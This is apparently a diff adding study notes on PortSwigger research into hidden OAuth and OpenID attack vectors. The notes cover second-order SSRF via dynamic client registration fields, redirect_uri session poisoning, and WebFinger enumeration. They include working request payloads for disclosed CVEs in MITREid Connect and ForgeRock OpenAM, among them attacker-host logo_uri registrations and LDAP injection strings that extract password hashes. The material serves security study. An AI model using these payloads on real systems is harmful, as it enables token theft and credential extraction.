@@ -1,0 +1,238 @@
+https://portswigger.net/research/hidden-oauth-attack-vectors
+
+
+Intro:
+- OAuth2 authorization protocol has been under fire for past 10 years
+- 3 vuln in OAuth2 and OpenID Connect:
+    + Dynamic Client Registration: SSRF by design
+    + Redirect_uri Session Poisoning
+    + WebFinger User Enumeration
+- We'll demonstrate these attack on 2 open source:
+    + ForgeRock OpenAM
+    + MITREid Connect
+
+Note about OpenID:
+- Is a popular extension to the OAuth protocol that bring a number of feature
+    + Such as: id_tokens, automatic discovery, a configuration endpoint,....
+- When test an OAuth application, there is a chance that target server also support OpenID
+    + Should fetch standard /.well-known/openid-configuration endpoint to test
+
+
+Chapter one: Dynamic Client Registration - SSRF by design
+- RFC7591: https://datatracker.ietf.org/doc/html/rfc7591
+
+- Since OAuth is a complex protocol, there are additional endpoint that may be support by the server even they never referenced from client-side HTML pages
+- One of hiddent URLs you may miss is Dynamic Client Registration endpoint
+- In order to authenticate users, OAuth server need to know detail about client application (such as: client name, client secret, redirect_uris,...)
+    + These can provided via local config, but server may also have special endpoint for that
+    + This endpoint is normally mapped to /register and accept POST request
+    + Example payload follow https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1
+    {
+        "application_type": "web",
+        "redirect_uris": ["https://client.example.org/callback"],
+        "client_name": "My Example",
+        "logo_uri": "https://client.example.org/logo.png",
+        "subject_type": "pairwise",
+        "sector_identifier_uri": "https://example.org/rdrct_uris.json",
+        "token_endpoint_auth_method": "client_secret_basic",
+        "jwks_uri": "https://client.example.org/public_keys.jwks",
+        "contacts": ["ve7jtb@example.org"],
+        "request_uris": ["https://client.example.org/rf.txt"]
+    }
+    + It look like we can SSRF, but most server do not resolve these immediately when they receive a registration request
+    + They save these params and use them during OAuth authorization flow
+    -> More like second-order SSRF, make black-box detection harder
+
+- Parameters are interesting for SSRF attacks:
+    + logo_uri: url references a logo for client application, after register, try to call /authorize using your new client_id. After login, server ask you to approve request and may display the image from logo_uri
+        "logo_uri": "https://client.example.org/logo.png",
+        + If server fetches the image by itself, SSRF should be triggered
+        + Alternatively, server may just include logo via a client-side <img> tag, may lead to XSS if URL is not escaped
+    + jwks_uri: url for client's JSON Web Key Set document
+        "jwks_uri": "https://client.example.org/public_keys.jwks",
+        + This needed on server for validating signed requests made to token endpoint when using JWTs for client authentication (RFC7523) (server need public key for authentication JWT signed)
+        + Test SSRF:
+            + Register a new client with malicious jwks_uri point to attacker server (burp collaborator)
+            + Perform authorization process to obtain authorization code for any user
+            + Fetch /token with following body:
+                grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...
+            + If vuln, server should perform server-to-server HTTP request to the supplied jwks_uri server to get public key to verify client_assertion param in request
+    + sector_identifier_uri: url references a file with a single JSON array of redirect_uri values
+        "sector_identifier_uri": "https://example.org/rdrct_uris.json",
+        + If supported, server may fetch this value as soon as you submit the dynamic registration request
+        + If not fetch immediately, try to perform authorization for client on server
+        + As it need to know redirect_uris in order to complete authorization flow, will force server make request to your malicious sector_identifier_uri
+    + request_uris: array of allowed request_uris for client
+        "request_uris": ["https://client.example.org/rf.txt"]
+        + May supported on authorization endpoint to provide url contain JWT with request information
+        + https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2
+        + Even if dynamic client register is not enabled or require authentication, we can still try to perform on authorization endpoint simply by using request_uri
+        + Example:
+            GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt
+        + Note:
+            + Do not confuse this request_uris with redirect_uri
+            + Redirect_uri is used for redirect after authorization
+            + Request_uri is fetched by server at the start of authorization process
+        + Many server we've seen do not allow request_uri values: they only allow whitelist urls that were pre-registered during client registration process
+
+- Parameters also contain URLs, used for client-side redirection/referencing
+    + redirect_uri: redirect after authorization
+    + client_uri: url of home page
+    + policy_uri: url that Relying Party provided so that end user can read about how their profile data will be used
+    + tos_uri: url that Relying Party provided so that end user can read about the Relying Party's terms of service
+    + initiate_login_uri: uri using https scheme that third party can use to initiate a login by the RP, also should be used for client-side redirect
+
+- All these param are optional according to OAuth and OpenID specifications and not always supported on a particular server (worth identify which params supported on server)
+- If target OpenID server, discovery endpoint .well-known/openid-configuration sometimes contains parameters such as "registration_endpoint", "request_uri_parameter_supported", and "require_request_uri_registration"
+
+
+CVE-2021-26715: SSRF via "logo_uri" in MITREid Connect
+- https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server
+    + Act as standalone OAuth authorization server
+    + In default configuration, require proper authorization and can't even create a new user - only administrators are allowed to create new account
+    + 
+    + Support OpenID Dynamic Client Registration protocol (RFC allow client register without admin permission) (https://openid.net/specs/openid-connect-registration-1_0.html)
+    + Problems:
+        + Endpoint /register: only expose in admin panel UI, but does not check current session at all (any user can use it if know about)
+        + Param logo_uri: on authorization step, when user is asked to approve the access requested by this new application, the authorization server make a server-to-server HTTP request to fetch image from logo_uri param, cache it, and display to user alongside other information (could be arbitrary URL)
+        + Happen when user access /openid-connect-server-webapp/api/clients/{id}/logo endpoint, return content of the fetched logo_uri
+            https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/master/openid-connect-server/src/main/java/org/mitre/openid/connect/web/ClientAPI.java#L509
+    + Since server not check the retrieved content, it may be misused by attacker to request any URL accessible from authorization server and display it content (SSRF)
+    + getClientLogo also does not enforce any image "Content-Type" header, allow attacker to display arbitrary HTML content from their url (XSS)
+
+- Exploit:
+    + We need to send dynamic client registration request, minimum param we need are redirect_uri and logo_uri
+        POST /openid-connect-server-webapp/register HTTP/1.1
+        {
+            "redirect_uris": [
+                "http://artsploit.com/redirect"
+            ],
+            "logo_uri": "http://artsploit.com/xss.html"
+        }
+    + To initiate server-to-server request to specified logo_uri, user should navigate the /api/clients/{client.id}/logo page to attacker server:
+    + Require:
+        + Low privilefed account to access last page
+        + If attacker can obtain registration, they can use that endpoint to make arbitrary HTTP request to local server and display its result
+        + It also can be used against already authenticated users to perform XSS attack through logo_uri
+    + These vuln are subtle to find, but since OAuth registration request format is standardized, it is still possible even in black-box scenarios
+
+
+
+Chapter two: "redirect_uri" Session Poisoning
+- It's about the server way carries over parameters during authentication flow
+- RFC6739: https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1
+    + Whenever OAuth server receives authorization request, should validate to ensure that all parameters are present and valid
+    + If request valid, authorization server authenticate resource owner and obtain an authorization decision (asking resource owner or by establishing approval via other means)
+    + So simple, on alomost diagrams displayed as a single step, but actually need 3 actions to implement
+- Process:
+    1. Validate all request params (/authorize)
+    2. Authenticate user (/login)
+    3. Approve/deny share data with external party (/confirm_access)
+    4. Redirect to redirect_uri include code/token
+- How server remember them, most obvious ways should be:
+    1. Store client_id and redirect_uri param in the session
+    2. Carry them over in HTTP query parameters for every step
+        Could require validity check on each step and validation procedures may different
+    3. Create a new interaction_id param, uniquely identifies each OAuth authorization flow that initiate with the server
+
+- As we can see, strict OAuth specification does not really give any advice about implement this behavior (diverge ways to do this)
+- Store in session is quite intuitive and look elegant in code, but can cause race condition problems when multiple authorization requests sent to same user
+    + Example:
+        /authorize?client_id=client&response_type=code&redirect_uri=http://artsploit.com/
+
+- When user click authorization in consent page, request body does not contain any params that client being authorized (/confirm_access step)
+-> Server get information client from session token in /authorize step
+-> Vuln to race condition and poisoning
+
+- Attacker process:
+    1. User visit a specially crafted page of attacker
+    2. Page redirect to OAuth authorization page with a trusted "client_id"
+        /authorize?client_id=TRUSTED_ID&redirect_uri=http://evil.com
+        -> server saved TRUSTED to session
+        -> Victim see consent page
+    3. In background, page send hidden cross-domain request to OAuth authorization page with an untrustworthy and "client_id" which poison session
+        /authorize?client_id=FAKE_ID&redirect_uri=http://evil.com
+        -> overwrite session client_id with FAKE_ID and redirect_uri to http://evil.com
+        + If attacker web is still open, it may run javascript in background
+    4. User approves first page, since session contain updated value, user will redirected to untrusted client
+
+- In many real system, allow client register
+-> May allow to register arbitrary redirect_uri and leak token to it
+
+- User has to approve any trusted client, if already approved the same client ealier, server might just redirect without asking
+    + But OpenID provides us with a prompt=consent param, it should ask user confirm even if they have granted it
+    + Without confirmation, exploitation is harder but still feasible, depending on the particular OAuth server implementation
+
+
+CVE-2021-27582: [MITREid Connect] "redirect_uri" bypass via Spring autobinding
+- Vuln to session poisoning described above
+- In OAuth2 flow:
+    + User navigate to auth page, the AuthorizationEndpoint class check all provided params
+    + User is authenticated, server display a confirm page, ask user to accept
+    + In order to pass param from one page to another, server uses @ModelAttribute("authorizationRequest") annotation on /oauth/confirm_access controller
+        https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/a2e8cb1a67a5546fdef11c604142a847e7c61261/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java#L104
+        + Get the authorizationRequest object from Model forwarded by previous controller
+        + Overwrite field values using current HTTP request query
+        + Then bypass the check on /authorize page
+    + Require: @SessionAttributes("authorizationRequest") to be present in user's session
+        + Can easily achieved by visitting /authorize page without performing any actions
+
+- Exploit:
+    + Attacker could craft 2 link to authorization and confirmation endpoint
+        /authorize?client_id=TRUSTED_ID&redirect_uri=TRUSTED_URL&prompt=consent&....
+        /oauth/confirm_access?client_id=TRUSTED_ID&redirectUri=EVIL_URL&prompt=consent&....
+        + client_id param can be from any trusted user (id that client-side already approve)
+        + when /confirm_access is accessed, it takes all params from url and poisons session model
+        + prompt=consent: force re-consent even victim already approve that to allow overwrite redirectUri
+    + Note: notice difference between redirect_uri and redirectUri, first is valid OAuth param while second is param that actually bind to "AuthorizationRequest.redirectUri" model attribute during mass assignment.
+
+    + The @ModelAttribute("authorizationRequest") annotation is not necessary and create additional risks during forwarding
+    + Safer way is just take these values from Map<String, Object> as input param
+    + But even if mass assignment did not exist, might still be exploit by race condition and make they share same session
+
+
+
+Chapter three: "/.well-known/webfinger" makes all user names well-known
+- /.well-known/webfinger: standard OpenID endpoint display information about users and resources used in server
+    + Example: validate that user "anonymous" has account in server
+        /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
+- https://openid.net/specs/openid-connect-discovery-1_0.html
+    + It said that rel param should have static value like above and resource should contain a valid url in form:
+        + http://host/user
+        + acct://user@host
+    + This URL parsed on server, not really used to send HTTP requests -> No SSRF
+    + Also you may try to find vuln like SQL injection as the endpoint not require any authentication
+- Note:
+    + It return 404 if params are invalid or username is not found, so be careful when adding it to your content discovery tool
+
+
+[ForgeRock OpenAm] LDAP Injection in Webfinger Protocol
+- Relate to /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
+- During source code analysis, found that OpenAM server is processing the request, it embeds user-supplied resource param inside a filter query to LDAP server.
+- LDAP query:
+    + https://github.com/OpenRock/OpenAM/blob/master/openam-core/src/main/java/com/sun/identity/sm/ldap/SMSLdapObject.java#L882
+
+    + String[] objs = { filter };
+        + filter = resource param
+    + String FILTER_PATTERN_ORG = "(&(objectclass=" + SMSEntry.OC_REALM_SERVICE + ")(" + SMSEntry.ORGANIZATION_RDN + "={0}))";
+        + It actually is (&(objectclass=sunRealmService)(o={0}))
+    + String sfilter = MessageFormat.format(FILTER_PATTERN_ORG, (Object[]) objs);
+        + MessageFormat.format(String pattern, Object... arguments)
+        + In this case, function is same as .replace('{0}', resource)
+        + But in some case it has its own special syntax (e.g. "'" for escaping)
+    + Can contain ( ) ; , * | and does not apply any escaping to them
+
+- Exploit:
+    + Enumerate a valid user
+        + Example: find user start with admin
+            resource=http://x/admin*
+        -> (&(objectclass=sunRealmService)(o=admin))
+        + Will get status code 200 if any user name start with admin else return 404
+    + Extract user's password hash character-by-character
+        + Example: check if username admin exist or not and if hash password startwith A
+            resource=http://x/admin)(sunKeyValue=userPassword=A*)(%2526
+        -> (&(objectclass=sunRealmService)(o=admin)(sunKeyValue=userPassword=A*)(&))
+        - It not limited to user attributes, can also be used to extract valid session token or private key used for token signing
+
+- This vuln exist in standard OpenID component of OpenAm server and does not require any authentication
+- Patched from update 13.5.1
